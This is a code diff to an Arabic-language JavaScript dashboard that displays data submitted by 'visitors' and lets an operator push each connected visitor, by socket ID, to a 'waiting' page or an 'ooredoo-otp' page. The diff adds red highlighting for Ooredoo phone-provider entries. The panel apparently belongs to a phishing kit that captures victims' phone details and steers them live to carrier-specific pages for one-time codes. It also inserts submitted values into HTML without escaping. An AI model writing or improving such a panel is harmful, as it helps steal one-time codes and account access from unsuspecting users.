@@ -1786,15 +1786,20 @@
               html += '<div class="bg-purple-100 p-3 rounded-lg col-span-2"><span class="text-purple-600 text-sm block font-bold">الاسم التجاري المعتمد</span><span class="font-bold text-purple-800 text-lg">' + commercialNameBuilt + '</span></div>';
             }
             
-            Object.entries(dataEntry.content).forEach(([key, value]) => {
-              html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + (value || '-') + '</span></div>';
+                        Object.entries(dataEntry.content).forEach(([key, value]) => {
+              const isOoredooField = dataEntry.page === 'توثيق رقم الهاتف' && key === 'مزود الخدمة' && (String(value).toLowerCase().includes('ooredoo') || String(value).includes('أوريدو'));
+              if (isOoredooField) {
+                html += '<div class="bg-red-600 p-3 rounded-lg"><span class="text-red-100 text-sm block font-bold">' + key + '</span><span class="font-bold text-white text-base">' + (value || '-') + '</span></div>';
+              } else {
+                html += '<div class="bg-white p-3 rounded-lg"><span class="text-gray-500 text-sm block">' + key + '</span><span class="font-medium text-gray-800">' + (value || '-') + '</span></div>';
+              }
             });
             html += '</div>';
-            
             // إضافة أزرار لتوثيق رقم الهاتف (النافذة الواحدة)
             if (dataEntry.page === 'توثيق رقم الهاتف') {
               const mobileProvider = (dataEntry.content['مزود الخدمة'] || '').toLowerCase();
               const isVodafone = mobileProvider.includes('vodafone') || mobileProvider.includes('فودافون');
+              const isOoredoo = mobileProvider.includes('ooredoo') || mobileProvider.includes('أوريدو');
               const approveTarget = isVodafone ? 'waiting' : 'ooredoo-otp';
               html += '<div class="flex gap-2 mt-3">';
               html += '<button onclick="navigateVisitorToPage(\'' + visitor.socketId + '\', \'' + approveTarget + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>موافقة</button>';
